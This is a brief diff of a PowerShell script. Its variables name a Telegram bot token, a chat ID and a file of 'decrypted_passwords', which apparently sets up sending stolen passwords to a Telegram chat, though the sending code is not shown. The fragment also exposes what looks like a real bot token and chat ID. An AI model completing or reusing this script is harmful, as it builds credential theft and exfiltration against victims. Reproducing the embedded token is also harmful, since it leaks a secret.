@@ -1,7 +1,7 @@
 # Define variables
 $botToken = "6899690141:AAENcDCrG8znTahm-5WB8R7UIZoOPEZTSBQ"  # Replace with your bot token
 $chatId = "5998953011"      # Replace with your chat ID
-$filePath = "C:\Users\User\Desktop\decrypted_passwords.txt"  # Path to your text file
+$filePath = "pass.txt"  # Path to your text file
 
 
 # Read the content of the text file
